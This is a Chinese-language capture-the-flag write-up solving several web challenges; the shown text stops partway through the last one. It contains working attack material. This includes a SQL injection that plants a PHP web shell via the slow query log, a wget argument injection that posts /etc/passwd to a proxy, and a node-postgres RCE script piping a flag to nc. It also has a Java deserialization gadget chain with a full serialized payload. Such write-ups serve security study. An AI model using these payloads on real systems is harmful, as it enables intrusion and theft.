Web
---

### EasySQL

访问robots.txt，可得三个文件index.php、config.php、helpyou2findflag.php。

fuzz黑名单，可发现select、单双引号、括号、分号、set、show、variables、等都没有过滤。

经测试可得到闭合方式为括号，且白名单为数据库记录行数，使用`1);{sqlinject}-- +`可以闭合查询语句并进行堆叠注入。

```php
show variables like '%slow_query_log%'; # 查询慢日志记录是否开启
setglobal slow_query_log=1; # 开启慢查询日志
setglobal slow_query_log_file='/var/www/html/helpyou2findflag.php'; # 设置慢查询日志位置
```

查询慢日志记录有关的变量。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4af8247812b201577f0ccc79146ec57d0dfe70ca.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)  
修改慢查询日志的保存位置。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-22818ef5e8efb70ea324cc043ef5a0213930b0e6.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)  
sleep函数在黑名单中因此不能直接使用，这里有一个考点：慢查询日志只会记录超过`long_query_time`时间的查询语句，因此要在写入`webshell`的sql语句中超过执行耗时命令，由于`union`和`sleep`都被过滤所以需要一定的绕过技巧，最简单的方式应该是修改`long_query_time`的值。

```php
1);setglobal long_query_time=0.000001;--+
1);show variables like 'long_query_time';--+
```

查询慢查询日志的判定时间。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e1175f3fa2d449ae54bfa4d736a5023054b4c9d.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)  
查询一个`webshell`，查询记录就会被添加到`slow_query_log_file`变量所指向的位置，这里`fuzz`黑名单可知一句话木马中常见的关键词被过滤了，绕过一下即可：`1);select '<?php $_REQUEST[a]($_REQUEST[b])?>';--+`  
访问`helpyou2findflag.php`即可访问webshell。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9768a3b5a39055e4f55db1292574c28f126f2e16.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_18%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

接下来就是找flag了，查看用户发现有rainbow用户，`ip:port/helpyou2findflag.php?a=system&b=awk%20-F%27:%27%20%27{%20print%20$1}%27%20/etc/passwd`,查看家目录发现有`ssh.log`，flag就在其中。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5abcf7f7024848243c4b9035b752967630bd7cf4.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_16%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

### FakeWget

题目只有三个路由，一个输入点，容易判断考点是命令注入，因此需要先不断测试传入数据并刷新观察回显，来猜测后端与wget命令拼接逻辑和过滤逻辑，下面是三个比较典型的fuzz示例：

```php
www.baidu.com
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-454ff2d2d960b44e29b2e14a8f3185e3d8246d3f.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_13%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

```php
teststr with space www.baidu.com
这里fuzz出空格不可用
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7d6d8af9081cacf525e6cda2dbd022645f081e7d.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_11%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

```php
ls;\nwww.baidu.com
```

这里fuzz出分号不可用，同理可得反引号`，|,;,&`均被过滤，同时能够测试出可利用`\n`绕过正则检查，只需要构造出空格且领用wget命令即可  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4eef73ababdc14ba524417185c2196cb993483e7.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_12%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

第一步测试出可利用\\n绕过合法性检查，且特殊符号被替换成空格，至此已经能够构造出POC读文件了，利用`http_proxy`和`--body-file`参数读取本地文件发送到代理服务器上：

```php
-e;http_proxy=http://ip:port/;--method=POST;--body-file=/etc/passwd;\nwww.baidu.com
```

这里特殊符号被替换成空格，`\n`绕过了检查wget的grep命令，并将`/etc/passwd`的文件内容发送到代理机上。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68947c1ea3b804bf01113adeccdfdf0607ac19a2.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_11%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fb591d8d033b41a41e194bd6acce246af52194f8.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_13%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

接下来就是找flag文件，第三个路由（点击getflag）访问后看网站源码，可知flag文件名称是`flag_is_here `![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e2528934e88670c89e81e86145d1aafbabd869bf.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_11%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

建议的思路是：`/etc/passwd`看到有ctf\_user用户，读取ctf\_user用户的`.bash_history`得到flask程序的根目录是`/home/ctf_user/basedirforwebapp/`，直接读文件`/home/ctf_user/basedirforwebapp/flag_is_here`即可得到flag。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0b8b082293fb22d037de194ff3842f2524e07095.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_10%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bb4ad4c3ca9b73390fb7147a32d1428f3adc6c2f.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_8%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

### EasyWAF

访问首页“/”时，发现cookie为`node=dGhlcmUgaXMgbm90aGluZ34h`，base64解码后结果为`“there is nothing~!”`。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3665e1f969a4e91165ab14101f609288f11ff56e.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

访问接口“/register”时，尝试进行注入，会提示“SQL Injection Attack Found! IP record!”。  
正常访问接口“/register”时，返回结果为“IP have recorded!”，同时发现设置了Cookie为`node=bWF4X2FsbG93ZWRfcGFja2V0`，base64解码后结果“max\_allowed\_packet”。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fe24d05ea62d5643a4b6b32dc1ae2577eded6652.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

访问“/hint”时，发现cookie为`node=fiBub2RlLXBvc3RncmVzIH4h`，base64解码后结果为“~ node-postgres ~!”。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-17dfbbc7736d81192309e05cd9bc36a61bdd832b.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

进一步进行注入探测，可以知道，过滤了以下字符串：

```php
"select", 
"union", 
"and", 
"or", 
"\\", 
"/", 
"*", 
" "
```

结合以上两点信息，可以知道此web服务使用nodejs，并且waf数据保存在mysql中，而注册数据保存在postgresql中，同时可以利用mysql的max\_allowed\_packet特性绕过waf，并结合nodejs postgres包的RCE漏洞进行利用，给出如下exp.py。

```php
from random import randint
import requests
import sys
# payload = "union"
def exp(url, cmd):
print(cmd)
    payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`%s`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--"""% (' '* 1024* 1024* 16, cmd)
    username = str(randint(1, 65535)) + str(randint(1, 65535)) + str(randint(1, 65535))
    data = { 'username': username + payload,'password': 'ABCDEF'}
print('ok')
    r = requests.post(url, data = data)
print(r.content)
if __name__ == '__main__':
    exp(sys.argv[1], sys.argv[2])
```

执行“python3 exp.py [http://ip:端口/register](http://ip/register) "cat flag.txt|nc ip 端口"”，如下：  
远程服务器监听9999端口，获得flag。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-43a18f8960ce018efdae7b2210f5fda58b8c2732.webp%23pic_center)

### Web-log

访问网站自动下载了一个log文件。  
打开查看内容，提示logname错误，那么可能需要提交logname。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-663c5f523378a96dd63c620d59d44201a3e449da.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

并且抓包可以发现filename的路径为`logs/info/info.2021-08-22.log`。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b8f1c795b2b854a500ce42f106c39f62a1047a7a.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

提交参数仍然返回错误，但可以看到改文件名其实是一个日志文件名，那么他应该是按日分割的，代入今天的年月日。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5fa389dd5b0b87dc6ef62c896e255d33742ab9b0.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

发现成功读取到日志文件（这里无法做目录遍历），根据日志内容可判断，该web是springboot，对应的jar包名为`cb-0.0.1-SNAPSHOT.jar`，尝试是否可以下载jar包。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eafead0b1257799b94c321c6a19984d5878e968c.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

成功下载jar包。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b1cc0de402a1aaf92c66f0e1d0e69fe70837fa66.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

反编译jar包，可以看到刚才访问请求方法为index。  
并且发现还存在一个`/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser`接口，对提交的user参数做base64解码，并进行反序列化，那么该处存在一个反序列化漏洞。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-80c2b729e151f0d7be4823fc8566414b959c21dc.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

分析`pom.xml`文件，发现有`commons-beanutils:1.8.2`依赖。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-174d99c5464a9f140caa951536bd33ce48462ae0.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

但`ysoserial`工具里的`CommonsBeanutils`链，除了依赖`commons-beanutils`以外，还依赖`commons-collections`，导致无法使用。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1377cf7f32387b9ff20abaa047c4ef90450b5db7.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

这里需要找到一条无依赖CC包的利用链，如下图所示：

```php
publicclassCommonsBeanutilsNoCC{
publicstaticvoid setFieldValue(Object obj, String fieldName, Object value) throwsException{
Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
}
publicbyte[] getPayload(byte[] clazzBytes) throwsException{
TemplatesImpl obj = newTemplatesImpl();
        setFieldValue(obj, "_bytecodes", newbyte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", newTransformerFactoryImpl());
finalBeanComparator comparator = newBeanComparator(null, String.CASE_INSENSITIVE_ORDER);
finalPriorityQueue<Object> queue = newPriorityQueue<Object>(2, comparator);
// stub data for replacement later
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", newObject[]{obj, obj});
// ==================
// 生成序列化字符串
ByteArrayOutputStream barr = newByteArrayOutputStream();
ObjectOutputStream oos = newObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
return barr.toByteArray();
}
}
```

上述的clazzBytes需替换成springboot回显class，代码如下：

```php
publicclassSpringEcho{
publicSpringEcho() throwsException{
{
Object httpresponse = null;
try{
Object requestAttributes = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("getRequestAttributes", newClass[0]).invoke(null, newObject[0]);
Object httprequest =  requestAttributes.getClass().getMethod("getRequest", newClass[0]).invoke(requestAttributes, newObject[0]);
                httpresponse =  requestAttributes.getClass().getMethod("getResponse", newClass[0]).invoke(requestAttributes, newObject[0]);
String s = (String)httprequest.getClass().getMethod("getHeader", newClass[]{String.class}).invoke(httprequest, newObject[]{"Cmd"});
if(s != null&& !s.isEmpty()) {
                    httpresponse.getClass().getMethod("setStatus", newClass[]{int.class}).invoke(httpresponse, newObject[]{newInteger(200)});
byte[] cmdBytes;
if(s.equals("echo") ) {
                        cmdBytes = System.getProperties().toString().getBytes();
} else{
String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? newString[]{"cmd.exe", "/c", s} : newString[]{"/bin/sh", "-c", s};
                        cmdBytes = new java.util.Scanner(newProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\\\A").next().getBytes();
}
Object getWriter = httpresponse.getClass().getMethod("getWriter", newClass[0]).invoke(httpresponse, newObject[0]);
                    getWriter.getClass().getMethod("write", newClass[]{String.class}).
                        invoke(getWriter, newObject[]{(newString(cmdBytes))});
                    getWriter.getClass().getMethod("flush", newClass[0]).invoke(getWriter, newObject[0]);
                    getWriter.getClass().getMethod("close", newClass[0]).invoke(getWriter, newObject[0]);
}
} catch(Exception e) {
                e.getStackTrace();
}
}
}
}
```

两者结合生成序列化数据，提交到服务端，数据包如下：

```php
POST /bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser HTTP/1.1
Host: 192.168.111.1:8081
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0(Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/91.0.4472.101Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: deviceid=1626766160499; xinhu_ca_rempass=0; xinhu_ca_adminuser=zhangsan
Connection: close
Cmd: cat /tmp/RyJSYfyVl6i2ZnB9/flag_kzucLifFImOTUiLC.txt
Content-Type: application/x-www-form-urlencoded
Content-Length: 4377
user=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAISQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////wBwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAACiDK/rq%2bAAAAMgCzAQAaVGVzdC9HYWRnZXQyMjY1MzgxMzc4NDExMDAHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAGkdhZGdldDIyNjUzODEzNzg0MTEwMC5qYXZhAQAGPGluaXQ%2bAQADKClWDAAHAAgKAAQACQEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcggACwEAD2phdmEvbGFuZy9DbGFzcwcADQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAAPABAKAA4AEQEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzCAATAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAFQAWCgAOABcBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHABkBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMABsAHAoAGgAdAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAfACAKAAQAIQEACmdldFJlcXVlc3QIACMBAAtnZXRSZXNwb25zZQgAJQEACWdldEhlYWRlcggAJwEAEGphdmEvbGFuZy9TdHJpbmcHACkBAANDbWQIACsBAAdpc0VtcHR5AQADKClaDAAtAC4KACoALwEACXNldFN0YXR1cwgAMQEAEWphdmEvbGFuZy9JbnRlZ2VyBwAzAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAA1ADYJADQANwEABChJKVYMAAcAOQoANAA6AQAJYWRkSGVhZGVyCAA8AQADVGFnCAA%2bAQAHc3VjY2VzcwgAQAEABGVjaG8IAEIBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAEQARQoAKgBGAQAQamF2YS9sYW5nL1N5c3RlbQcASAEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMAEoASwoASQBMAQATamF2YS91dGlsL0hhc2h0YWJsZQcATgEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAFAAUQoATwBSAQAIZ2V0Qnl0ZXMBAAQoKVtCDABUAFUKACoAVgEAB29zLm5hbWUIAFgBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DABaAFsKAEkAXAEAC3RvTG93ZXJDYXNlDABeAFEKACoAXwEABndpbmRvdwgAYQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABjAGQKACoAZQEAB2NtZC5leGUIAGcBAAIvYwgAaQEABy9iaW4vc2gIAGsBAAItYwgAbQEAEWphdmEvdXRpbC9TY2FubmVyBwBvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwBxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwABwBzCgByAHQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAdgB3CgByAHgBABFqYXZhL2xhbmcvUHJvY2VzcwcAegEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAHwAfQoAewB%2bAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAHAIAKAHAAgQEAA1xcQQgAgwEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwAhQCGCgBwAIcBAARuZXh0DACJAFEKAHAAigEACWdldFdyaXRlcggAjAEABXdyaXRlCACOAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgcAkAoAkQAJAQAGPT09PT09CACTAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsMAJUAlgoAkQCXAQAFKFtCKVYMAAcAmQoAKgCaCgCRAFIBAAVmbHVzaAgAnQEABWNsb3NlCACfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAoQEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKMBAA1nZXRTdGFja1RyYWNlAQAgKClbTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDsMAKUApgoApACnAQAEQ29kZQEACkV4Y2VwdGlvbnMBABNbTGphdmEvbGFuZy9TdHJpbmc7BwCrAQACW0IHAK0BAA1TdGFja01hcFRhYmxlAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAsAoAsQAJACEAAgCxAAAAAAABAAEABwAIAAIAqQAAAjIACgAJAAAB3Sq3ALIBTBIMuAASEhQDvQAOtgAYAQO9AAS2AB5NLLYAIhIkA70ADrYAGCwDvQAEtgAeTiy2ACISJgO9AA62ABgsA70ABLYAHkwttgAiEigEvQAOWQMSKlO2ABgtBL0ABFkDEixTtgAewAAqOgQZBAGlAAsZBLYAMJkABqcBUyu2ACISMgS9AA5ZA7IAOFO2ABgrBL0ABFkDuwA0WREAyLcAO1O2AB5XK7YAIhI9Bb0ADlkDEipTWQQSKlO2ABgrBb0ABFkDEj9TWQQSQVO2AB5XGQQSQ7YAR5kAEbgATbYAU7YAVzoFpwBhElm4AF22AGASYrYAZpkAGQa9ACpZAxJoU1kEEmpTWQUZBFOnABYGvQAqWQMSbFNZBBJuU1kFGQRTOga7AHBZuwByWRkGtwB1tgB5tgB/twCCEoS2AIi2AIu2AFc6BSu2ACISjQO9AA62ABgrA70ABLYAHjoHGQe2ACISjwS9AA5ZAxIqU7YAGBkHBL0ABFkDuwCRWbcAkhKUtgCYuwAqWRkFtwCbtgCYEpS2AJi2AJxTtgAeVxkHtgAiEp4DvQAOtgAYGQcDvQAEtgAeVxkHtgAiEqADvQAOtgAYGQcDvQAEtgAeV6cADjoIGQi2AKhXpwADsQABAAYBzgHRAKIAAQCvAAAAOwAJ/wB7AAUHAAIHAAQHAAQHAAQHACoAAAL7AGolUgcArPwAJAcArvoAhv8AAgACBwACBwAEAAEHAKIKAKoAAAAEAAEAogABAAUAAAACAAZwdAAEUHducnB3AQB4cQB%2bAA54
```

拿到回显了。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-31a42ea0345f74877743b9e7dff16de06f566f64.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

tmp目录下找到flag文件。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e4c74ddfe08693496efbde0902ac592531f45390.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

获取到flag。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a885d96fc3dbf5bd0e45b7d3d44eaf40e3bab342.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

### ZIPZIP

当解压操作可以覆盖上一次解压文件就可以造成任意文件上传漏洞。  
查看upload.php源码：  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7db026fc89aebffd93337a483021b5944a1db7bc.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

zip.php  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-527dac0f97e6ea48324ef224e5caccd0c8f78740.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_14%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

构造payload：  
先构造一个指向`/var/www/html`的软连接(因为html目录下是web环境，为了后续可以getshell)。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dfc0c5f2b55173d9fe222d6444abaaea1b3c12d3.webp%23pic_center)

利用命令`(zip --symlinks test.zip ./*)`对test文件进行压缩。  
